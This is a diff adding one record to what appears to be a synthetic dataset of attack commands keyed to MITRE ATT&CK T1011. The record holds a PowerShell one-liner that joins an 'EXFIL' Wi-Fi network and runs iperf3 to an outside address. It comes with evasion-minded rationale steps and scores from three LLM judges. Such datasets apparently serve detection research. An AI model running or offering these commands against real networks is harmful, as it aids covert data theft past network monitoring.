@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
+  "explanation": "Connects to a non-corporate Wi\u2011Fi network and exfiltrates by binding iperf3 to the Wi\u2011Fi interface on an uncommon port, explicitly using Wi\u2011Fi as an alternate medium (T1011).",
+  "rationale_steps": [
+    "Join a dedicated Wi\u2011Fi network separate from the primary network.",
+    "Discover the Wi\u2011Fi interface's local IP.",
+    "Run iperf3 client bound to that IP using a high port.",
+    "Limit duration to reduce exposure."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce74f7d7",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, proper separators, and valid parameters for netsh, Get-Net* cmdlets, and iperf3.",
+        "semantic_score": 4,
+        "semantic_justification": "It connects to a Wi\u2011Fi network and binds traffic to that interface using iperf3, aligning with T1011, but assumes an existing WLAN profile and uses a throughput tool rather than exfiltrating actual data.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:48:51.280450Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, correct pipe operators, error handling with -ErrorAction, and proper variable assignment and usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by explicitly connecting to an alternative Wi-Fi network, determining the correct IP address for that interface, and using iperf3 to exfiltrate data over this secondary network medium on an uncommon port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:48:57.254772Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for all tools, and no impossible constructs, making it parseable in Powershell.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses `iperf3` to bind to a specific Wi-Fi interface's IP for exfiltration over an alternate network medium (T1011), but the initial `netsh wlan connect` step typically requires administrative privileges for arbitrary network connections, contradicting the 'Privilege: None' claim and presenting a minor realism gap.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:17:54.708366Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
